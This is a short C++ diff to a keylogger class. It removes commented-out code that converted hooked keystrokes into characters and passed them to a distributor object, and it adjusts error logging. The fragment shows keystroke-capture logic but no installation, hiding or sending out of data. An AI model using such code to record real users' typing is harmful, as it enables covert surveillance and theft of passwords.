@@ -22,49 +22,10 @@ void Keylogger::init(void) {
 		std::string resDir = StaticTools::GetProjectResourceDirectory();
 		StaticTools::CreateFolder(resDir);
 
-		//_diffuser.init();
-		//DebugLogFile::Log.open(resDir + "\\debug.log");
-		//ErrorLogFile::Log.open(resDir + "\\error.log");
 	} catch (std::runtime_error const& e) {
-		(void)e;
-		//ErrorLogFile::Log << e.what() << std::endl;
+		StaticTools::Log << e.what() << std::endl;
 	}
 }
-
-/*void Keylogger::keyPressed(LPKBDLLHOOKSTRUCT key)
-{
-	std::unique_ptr<AInputType> input(new InputKeyboard);
-	WORD wChar = 0;
-	unsigned char c = 0;
-	BYTE keyboard_state[256];
-	int ret = 0;
-	std::string data;
-
-	if (GetKeyboardState(keyboard_state)) {
-		ret = ToAscii(key->vkCode, key->scanCode, keyboard_state, &wChar, 0);
-		c = (unsigned char)wChar;
-
-		if (ret > 0 && std::isprint(c)) {
-			if (_shift == KeyState::KS_PRESSED || _maj == KeyState::KS_PRESSED) {
-				if (std::isalpha(c) && std::islower(c)) {
-					c -= 32;
-				} else {
-					// ...
-				}
-			}
-			data.push_back(c);
-			*_distributor << (*input << data);
-		} else {
-			if (_keys.find(key->vkCode) != _keys.cend()) {
-				data = _keys.at(key->vkCode)(KeyState::KS_PRESSED);
-				if (!data.empty()) {
-					*_distributor << (*input << data);
-				}
-			}
-		}
-	}
-}*/
-
 
 void Keylogger::keyPressed(LPKBDLLHOOKSTRUCT p) {
 	std::unique_ptr<AInputType> input(new InputKeyboard);
@@ -209,14 +170,6 @@ void Keylogger::keyPressed(LPKBDLLHOOKSTRUCT p) {
 
 void Keylogger::keyReleased(LPKBDLLHOOKSTRUCT p) {
 	std::unique_ptr<AInputType> input(new InputKeyboard);
-	//std::string data;
-
-	/*if (_keys.find(key->vkCode) != _keys.cend()) {
-		data = _keys.at(key->vkCode)(KeyState::KS_RELEASED);
-		if (!data.empty()) {
-			*_distributor << (*input << data);
-		}
-	}*/
 
 	switch (p->vkCode) {
 	case VK_BACK: *_distributor << (*input << Keylogger::key_Backspace(KeyState::KS_RELEASED)); break;
